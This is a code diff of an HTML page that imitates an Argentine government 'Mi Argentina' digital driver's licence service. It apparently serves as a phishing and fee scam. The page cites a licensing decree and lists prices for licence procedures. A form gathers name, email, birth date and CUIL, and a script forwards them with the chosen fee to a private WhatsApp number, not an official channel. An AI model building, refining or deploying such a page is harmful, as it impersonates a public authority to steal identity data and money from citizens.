@@ -8,32 +8,11 @@
   <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Encode+Sans:wght@100;200;300;400;500;600;700;800;900&display=swap">
 
   <style>
-    body {
-      font-family: 'Encode Sans', sans-serif;
-      margin: 0;
-    }
-
-    .navbar {
-      background: #fff;
-      border-bottom: 3px solid #ffd100;
-      padding: 10px 20px;
-    }
-
-    .navbar img {
-      height: 50px;
-    }
-
-    .header {
-      background: #0072bb;
-      color: white;
-      padding: 30px;
-    }
-
-    .container {
-      max-width: 900px;
-      margin: auto;
-      padding: 20px;
-    }
+    body { font-family: 'Encode Sans', sans-serif; margin: 0; }
+    .navbar { background: #fff; border-bottom: 3px solid #ffd100; padding: 10px 20px; }
+    .navbar img { height: 70px; }
+    .header { background: #0072bb; color: white; padding: 30px; }
+    .container { max-width: 900px; margin: auto; padding: 20px; }
 
     .btn-licencia {
       background-color: #0072bb;
@@ -45,56 +24,220 @@
       text-decoration: none;
       display: inline-block;
       margin-top: 20px;
+      border: none;
+      cursor: pointer;
     }
 
-    .btn-whatsapp-inline {
-      background-color: #25d366;
-      color: white;
-      padding: 2px 10px;
-      border-radius: 4px;
-      text-decoration: none;
-      font-weight: bold;
+    .btn-licencia:disabled {
+      background-color: #999;
+      cursor: not-allowed;
+    }
+
+    input, select {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 5px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+    }
+
+    .error {
+      color: red;
+      font-size: 13px;
+      margin-bottom: 10px;
+      display: none;
     }
   </style>
 </head>
 
 <body>
 
-  <!-- NAVBAR CON TU LOGO -->
-  <div class="navbar">
-    <img src="https://via.placeholder.com/200x50?text=Mi+Billetera" alt="Mi Billetera">
+<div class="navbar">
+  <img src="https://i.postimg.cc/638qB6NY/1776094869296.png">
+</div>
+
+<div class="header">
+  <h1>Licencia de conducir digital</h1>
+  <p>La versión digital de tu licencia disponible en Mi Billetera.</p>
+</div>
+
+<div class="container">
+  <h2>Nueva licencia nacional de conducir digital</h2>
+  <p>A partir del Decreto 196/2025 la licencia nacional de conducir será otorgada en formato digital.</p>
+
+  <img src="https://i.postimg.cc/HnS8bMQY/carnet-(4).jpg" width="100%">
+
+  <div style="text-align:center;">
+    <a href="#" class="btn-licencia">Ver Licencia Digital</a>
   </div>
 
-  <!-- HEADER MODIFICADO -->
-  <div class="header">
-    <h1>Licencia de conducir digital</h1>
-    <p>La versión digital de tu licencia disponible en Mi Billetera.</p>
-  </div>
+  <h2>Formulario de inicio de trámite</h2>
 
-  <div class="container">
-    <h2>Nueva licencia nacional de conducir digital</h2>
-    <p>
-      A partir del Decreto 196/2025 la licencia nacional de conducir será otorgada en formato digital y podrá ser replicada en formato físico.
+  <select id="tramite" onchange="mostrarCampos(); validarFormulario();" required>
+    <option value="">Seleccionar trámite</option>
+    <option value="primera">Mi primera licencia - $120.000</option>
+    <option value="extravio">Renovación por extravío/robo - $100.000</option>
+    <option value="vencimiento">Renovación por vencimiento - $90.000 / $110.000</option>
+    <option value="ampliacion">Ampliación de categoría - $130.000</option>
+  </select>
+
+  <form id="formulario" oninput="validarFormulario()" onsubmit="enviarWhatsApp(event)" style="display:none;">
+
+    <input type="text" id="nombre" placeholder="Nombre" required>
+    <input type="text" id="apellido" placeholder="Apellido" required>
+
+    <input type="email" id="email" placeholder="Correo electrónico (ej: ejemplo@gmail.com)" required>
+    <div id="errorEmail" class="error">Email inválido</div>
+
+    <input type="text" id="fecha" placeholder="Fecha de nacimiento (Ej: 15/03/1990)" required>
+
+    <input type="text" id="cuil" placeholder="CUIL (Ej: 20-12345678-3)" required>
+    <div id="errorCuil" class="error">CUIL inválido</div>
+
+    <select id="categoria" style="display:none;">
+      <option value="">Seleccionar categoría</option>
+      <option>A.1 - Motocicletas hasta 50 cc</option>
+      <option>A.2.1 - Motocicletas hasta 150 cc</option>
+      <option>A.2.2 - Motocicletas hasta 300 cc</option>
+      <option>A.3 - Motocicletas más de 300 cc</option>
+      <option>B.1 - Automóviles particulares hasta 3.500 kg</option>
+      <option>B.2 - Automóviles con acoplado</option>
+      <option>C - Camiones sin acoplado</option>
+      <option>D.1 - Transporte de pasajeros hasta 8 plazas</option>
+      <option>D.2 - Transporte de pasajeros más de 8 plazas</option>
+      <option>E.1 - Vehículos con remolque</option>
+      <option>F - Personas con discapacidad</option>
+      <option>G - Maquinaria especial no agrícola</option>
+    </select>
+
+    <select id="vencimiento" style="display:none;">
+      <option value="">Seleccionar vencimiento</option>
+      <option value="3">Vencimiento 3 años</option>
+      <option value="5">Vencimiento 5 años</option>
+    </select>
+
+    <button id="btnEnviar" class="btn-licencia" disabled>Enviar solicitud</button>
+
+  </form>
+
+</div>
+
+<footer style="background:#f5f5f5; padding:30px; margin-top:40px;">
+  <div class="container" style="text-align:center;">
+    <p><strong>Mi Billetera | Documentación Digital</strong></p>
+    <p>Gestión y visualización de documentación digital de forma rápida y segura.</p>
+    <p style="margin-top:20px; font-size:12px; color:#666;">
+      © 2026 Mi Billetera | mi Argentina. Todos los derechos reservados.
     </p>
-
-    <img src="https://i.postimg.cc/rpffzc7v/carnet-(2).jpg" width="100%">
-
-    <div style="text-align:center;">
-      <a href="https://miargentina-servicios.github.io/licencia/ConsultaLNC.html" class="btn-licencia">
-        Ver Licencia Digital
-      </a>
-    </div>
-
-    <h2>¿Cómo hago para tenerla?</h2>
-
-    <p>1. Escribinos al 
-      <a href="https://wa.me/5491131602393" class="btn-whatsapp-inline">WhatsApp</a>
-    </p>
-
-    <p>2. Identificate con tu DNI e iniciá el proceso.</p>
-    <p>3. Accedé a tu licencia digital.</p>
-
   </div>
+</footer>
+
+<script>
+function mostrarCampos(){
+  let tipo = document.getElementById("tramite").value;
+  document.getElementById("formulario").style.display = "block";
+
+  document.getElementById("categoria").style.display = "none";
+  document.getElementById("vencimiento").style.display = "none";
+
+  if(tipo === "primera" || tipo === "extravio" || tipo === "ampliacion"){
+    document.getElementById("categoria").style.display = "block";
+  }
+
+  if(tipo === "vencimiento"){
+    document.getElementById("vencimiento").style.display = "block";
+  }
+}
+
+/* 🔥 FORMATO AUTOMÁTICO CUIL */
+document.getElementById("cuil").addEventListener("input", function(e){
+  let valor = e.target.value.replace(/\D/g, "").substring(0,11);
+
+  if(valor.length > 2 && valor.length <= 10){
+    valor = valor.slice(0,2) + "-" + valor.slice(2);
+  } else if(valor.length > 10){
+    valor = valor.slice(0,2) + "-" + valor.slice(2,10) + "-" + valor.slice(10);
+  }
+
+  e.target.value = valor;
+});
+
+function validarCUIL(cuil){
+  return /^\d{2}-\d{8}-\d{1}$/.test(cuil);
+}
+
+function validarEmail(email){
+  return /^[^\s@]+@[^\s@]+\.(com|com\.ar|net|org|ar)$/i.test(email);
+}
+
+function validarFormulario(){
+  let tipo = document.getElementById("tramite").value;
+  let nombre = document.getElementById("nombre").value;
+  let apellido = document.getElementById("apellido").value;
+  let email = document.getElementById("email").value;
+  let fecha = document.getElementById("fecha").value;
+  let cuil = document.getElementById("cuil").value;
+  let categoria = document.getElementById("categoria").value;
+  let vencimiento = document.getElementById("vencimiento").value;
+
+  let cuilValido = validarCUIL(cuil);
+  let emailValido = validarEmail(email);
+
+  document.getElementById("errorCuil").style.display = cuil && !cuilValido ? "block" : "none";
+  document.getElementById("errorEmail").style.display = email && !emailValido ? "block" : "none";
+
+  let valido = nombre && apellido && emailValido && fecha && cuilValido && tipo;
+
+  if(document.getElementById("categoria").style.display === "block"){
+    valido = valido && categoria;
+  }
+
+  if(document.getElementById("vencimiento").style.display === "block"){
+    valido = valido && vencimiento;
+  }
+
+  document.getElementById("btnEnviar").disabled = !valido;
+}
+
+function enviarWhatsApp(e){
+  e.preventDefault();
+
+  let tipo = document.getElementById("tramite").value;
+  let nombre = document.getElementById("nombre").value;
+  let apellido = document.getElementById("apellido").value;
+  let email = document.getElementById("email").value;
+  let fecha = document.getElementById("fecha").value;
+  let cuil = document.getElementById("cuil").value;
+  let categoria = document.getElementById("categoria")?.value || "";
+  let vencimiento = document.getElementById("vencimiento")?.value || "";
+
+  let tipoTexto = "";
+  let precio = "";
+
+  if(tipo==="primera"){ tipoTexto="Primera licencia"; precio="$120.000"; }
+  if(tipo==="extravio"){ tipoTexto="Renovación por extravío/robo"; precio="$100.000"; }
+  if(tipo==="vencimiento"){ tipoTexto="Renovación por vencimiento"; precio=(vencimiento=="5")?"$110.000":"$90.000"; }
+  if(tipo==="ampliacion"){ tipoTexto="Ampliación de categoría"; precio="$130.000"; }
+
+  let mensaje =
+`*SOLICITUD DE LICENCIA*
+
+📌 Tipo de trámite: ${tipoTexto}
+
+👤 Nombre: ${nombre}
+👤 Apellido: ${apellido}
+📧 Email: ${email}
+🎂 Fecha de nacimiento: ${fecha}
+🆔 CUIL: ${cuil}
+${categoria ? "🚗 Categoría: "+categoria : ""}
+${vencimiento ? "📅 Vencimiento: "+vencimiento+" años" : ""}
+
+💰 Precio: ${precio}`;
+
+  let url = "https://wa.me/5491131602393?text=" + encodeURIComponent(mensaje);
+  window.open(url, "_blank");
+}
+</script>
 
 </body>
-</html>
+  </html>
